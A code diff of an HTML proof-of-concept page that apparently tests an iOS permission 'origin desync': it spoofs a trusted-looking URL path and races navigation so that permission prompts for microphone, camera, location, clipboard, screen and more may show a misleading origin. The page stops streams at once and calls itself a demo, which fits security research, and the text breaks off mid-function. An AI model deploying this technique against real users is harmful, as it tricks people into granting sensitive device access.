@@ -2,7 +2,7 @@
 <html>
 <head>
 <meta charset="utf-8">
-<title>Microphone Origin Desync PoC</title>
+<title>iOS Permission Origin Desync – Full PoC</title>
 <meta name="viewport" content="width=device-width, initial-scale=1">
 
 <style>
@@ -13,18 +13,19 @@ body {
 }
 
 button {
-  font-size: 15px;
+  font-size: 14px;
   padding: 10px 14px;
   border-radius: 10px;
   border: none;
   background: #007aff;
   color: #fff;
+  margin: 6px;
 }
 
 #panel {
   display: none;
-  max-width: 420px;
-  margin: 80px auto;
+  max-width: 460px;
+  margin: 60px auto;
   background: #fff;
   padding: 24px;
   border-radius: 16px;
@@ -34,7 +35,7 @@ button {
 
 .notice {
   margin-top: 14px;
-  font-size: 13px;
+  font-size: 12px;
   color: #b00020;
 }
 </style>
@@ -47,53 +48,98 @@ button {
 </div>
 
 <div id="panel">
-  <h2>Request Microphone</h2>
-  <p>Tap the button below to request microphone permission.</p>
+  <h2>iOS Permission Requests</h2>
+  <p>Tap any button. Observe origin shown in permission dialog.</p>
 
-  <button onclick="getMic()">Enable Microphone</button>
-  <p id="output">Microphone: -</p>
+  <div>
+    <button onclick="reqMic()">🎤 Microphone</button>
+    <button onclick="reqCam()">🎥 Camera</button>
+    <button onclick="reqGeo()">📍 Geolocation</button>
+    <button onclick="reqMotion()">🧭 Motion</button>
+    <button onclick="reqNotif()">🔔 Notification</button>
+    <button onclick="reqClipboard()">📋 Clipboard</button>
+    <button onclick="reqBluetooth()">🟦 Bluetooth</button>
+    <button onclick="reqScreen()">🖥 Screen</button>
+  </div>
+
+  <p id="output">Result: -</p>
 
   <div class="notice">
-    Demo only — observe origin shown in permission dialog
+    Demo only — origin may differ from the one the user interacted with
   </div>
 </div>
 
 <script>
-const panel   = document.getElementById('panel');
-const trigger = document.getElementById('trigger');
-const output  = document.getElementById('output');
+const panel  = document.getElementById('panel');
+const output = document.getElementById('output');
 
-function getMic() {
-  if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
-    output.textContent = 'getUserMedia not supported';
-    return;
-  }
+/* ================= PERMISSION APIs ================= */
 
+function reqMic() {
   navigator.mediaDevices.getUserMedia({ audio: true })
-    .then(stream => {
-      output.textContent = 'Microphone access granted';
-
-      // stop immediately (no actual recording)
-      stream.getTracks().forEach(t => t.stop());
-    })
-    .catch(err => {
-      output.textContent = 'Permission denied';
-    });
+    .then(s => { stop(s); output.textContent = 'Mic granted'; })
+    .catch(() => output.textContent = 'Mic denied');
 }
 
-/*
- * Step 1:
- * Manipulate visible URL to a trusted-looking path
- */
-trigger.onclick = () => {
+function reqCam() {
+  navigator.mediaDevices.getUserMedia({ video: true })
+    .then(s => { stop(s); output.textContent = 'Camera granted'; })
+    .catch(() => output.textContent = 'Camera denied');
+}
+
+function reqGeo() {
+  navigator.geolocation.getCurrentPosition(
+    p => output.textContent = 'Geo granted',
+    () => output.textContent = 'Geo denied'
+  );
+}
+
+function reqMotion() {
+  if (typeof DeviceMotionEvent?.requestPermission === 'function') {
+    DeviceMotionEvent.requestPermission()
+      .then(r => output.textContent = 'Motion: ' + r)
+      .catch(() => output.textContent = 'Motion denied');
+  } else {
+    output.textContent = 'Motion not supported';
+  }
+}
+
+function reqNotif() {
+  Notification.requestPermission()
+    .then(r => output.textContent = 'Notification: ' + r);
+}
+
+function reqClipboard() {
+  navigator.clipboard.readText()
+    .then(() => output.textContent = 'Clipboard granted')
+    .catch(() => output.textContent = 'Clipboard denied');
+}
+
+function reqBluetooth() {
+  navigator.bluetooth.requestDevice({ acceptAllDevices: true })
+    .then(() => output.textContent = 'Bluetooth granted')
+    .catch(() => output.textContent = 'Bluetooth denied');
+}
+
+function reqScreen() {
+  navigator.mediaDevices.getDisplayMedia({ video: true })
+    .then(s => { stop(s); output.textContent = 'Screen granted'; })
+    .catch(() => output.textContent = 'Screen denied');
+}
+
+function stop(stream) {
+  stream.getTracks().forEach(t => t.stop());
+}
+
+/* ================= ORIGIN DESYNC LOGIC ================= */
+
+/* Step 1: spoof trusted-looking path */
+document.getElementById('trigger').onclick = () => {
   history.pushState({}, '', '/trusted');
   panel.style.display = 'block';
 };
 
-/*
- * Step 2:
- * Trigger a navigation race shortly after permission flow starts
- */
+/* Step 2: navigation race after permission flow starts */
 window.addEventListener('pageshow', () => {
   requestAnimationFrame(() => {
     requestAnimationFrame(() => {
